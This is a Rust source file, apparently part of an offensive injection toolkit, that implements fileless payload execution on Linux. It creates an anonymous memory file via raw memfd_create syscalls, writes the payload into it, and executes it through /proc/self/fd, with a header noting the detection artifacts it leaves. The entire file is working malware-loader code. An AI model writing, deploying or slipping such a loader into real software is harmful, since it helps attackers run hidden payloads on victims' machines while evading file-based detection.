//! Linux Fileless Execution
//!
//! Uses memfd_create + fexecve for fileless execution:
//! 1. Create anonymous memory file with memfd_create
//! 2. Write payload to memory file
//! 3. Execute with fexecve (or fallback via /proc/self/fd/)
//!
//! Detection artifacts:
//! - auditd: memfd_create syscall
//! - /proc: Process with fd pointing to memfd
//! - Memory: Executable with no backing file

#![cfg(unix)]

use super::InjectionError;
use std::ffi::CString;
use std::os::unix::io::RawFd;

// memfd_create flags
const MFD_CLOEXEC: u32 = 0x0001;
const MFD_ALLOW_SEALING: u32 = 0x0002;

/// Run payload as fileless executable.
pub fn run_fileless(payload: &[u8]) -> Result<(), InjectionError> {
    // Create anonymous memory file
    let fd = memfd_create("", MFD_CLOEXEC)
        .map_err(|e| InjectionError::AllocFailed(e))?;

    // Write payload to memfd
    write_all(fd, payload)
        .map_err(|e| InjectionError::WriteFailed(e))?;

    // Execute via /proc/self/fd/
    exec_memfd(fd)
        .map_err(|e| InjectionError::RunFailed(e))?;

    // Should not reach here if exec succeeds
    Ok(())
}

/// Create anonymous memory file.
fn memfd_create(name: &str, flags: u32) -> Result<RawFd, String> {
    let c_name = CString::new(name).map_err(|e| e.to_string())?;

    // syscall number for memfd_create: 319 on x86_64
    #[cfg(target_arch = "x86_64")]
    const SYS_MEMFD_CREATE: i64 = 319;

    #[cfg(target_arch = "x86")]
    const SYS_MEMFD_CREATE: i64 = 356;

    #[cfg(target_arch = "aarch64")]
    const SYS_MEMFD_CREATE: i64 = 279;

    let fd: i64;
    unsafe {
        #[cfg(target_arch = "x86_64")]
        {
            std::arch::asm!(
                "syscall",
                in("rax") SYS_MEMFD_CREATE,
                in("rdi") c_name.as_ptr(),
                in("rsi") flags,
                lateout("rax") fd,
                out("rcx") _,
                out("r11") _,
            );
        }

        #[cfg(target_arch = "aarch64")]
        {
            std::arch::asm!(
                "svc #0",
                in("x8") SYS_MEMFD_CREATE,
                in("x0") c_name.as_ptr(),
                in("x1") flags,
                lateout("x0") fd,
            );
        }
    }

    if fd < 0 {
        return Err(format!("memfd_create failed: {}", fd));
    }

    Ok(fd as RawFd)
}

/// Write all data to file descriptor.
fn write_all(fd: RawFd, data: &[u8]) -> Result<(), String> {
    extern "C" {
        fn write(fd: i32, buf: *const u8, count: usize) -> isize;
    }

    let mut written = 0;
    while written < data.len() {
        let n = unsafe {
            write(fd, data[written..].as_ptr(), data.len() - written)
        };
        if n <= 0 {
            return Err(format!("write failed at offset {}", written));
        }
        written += n as usize;
    }

    Ok(())
}

/// Execute memfd via /proc/self/fd/N.
fn exec_memfd(fd: RawFd) -> Result<(), String> {
    extern "C" {
        fn execve(
            pathname: *const i8,
            argv: *const *const i8,
            envp: *const *const i8,
        ) -> i32;
    }

    // Build path to fd
    let fd_path = format!("/proc/self/fd/{}", fd);
    let c_path = CString::new(fd_path).map_err(|e| e.to_string())?;

    // Empty argv and envp
    let argv: [*const i8; 1] = [std::ptr::null()];
    let envp: [*const i8; 1] = [std::ptr::null()];

    unsafe {
        let result = execve(c_path.as_ptr(), argv.as_ptr(), envp.as_ptr());
        if result < 0 {
            return Err(format!("execve failed: {}", result));
        }
    }

    // Should never reach here
    Ok(())
}
